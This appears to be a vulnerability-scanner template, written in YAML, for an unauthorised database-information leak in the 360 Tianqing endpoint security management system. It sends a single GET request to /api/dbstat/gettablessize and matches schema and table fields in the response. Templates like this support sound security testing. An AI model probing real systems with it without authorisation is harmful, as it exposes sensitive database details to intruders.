expression: r0()
id: 360tianqing-gettablessize-database-info-leakage
info:
  author: "daffainfo,\u4F60\u662F\u732A"
  description: "360\u5929\u64CE \u5B58\u5728\u672A\u6388\u6743\u8D8A\u6743\u8BBF\u95EE\
    \uFF0C\u9020\u6210\u654F\u611F\u4FE1\u606F\u6CC4\u9732 title=\"360\u65B0\u5929\
    \u64CE\" app=\"360\u5929\u64CE\u7EC8\u7AEF\u5B89\u5168\u7BA1\u7406\u7CFB\u7EDF\
    \""
  name: "360\u5929\u64CE gettablessize \u6570\u636E\u5E93\u4FE1\u606F\u6CC4\u9732\u6F0F\
    \u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/360%E5%A4%A9%E6%93%8E%20gettablessize%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  severity: medium
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"schema_name":')
      && response.body.bcontains(b'"reason":') && response.body.bcontains(b'"table_name":')
    request:
      method: GET
      path: /api/dbstat/gettablessize
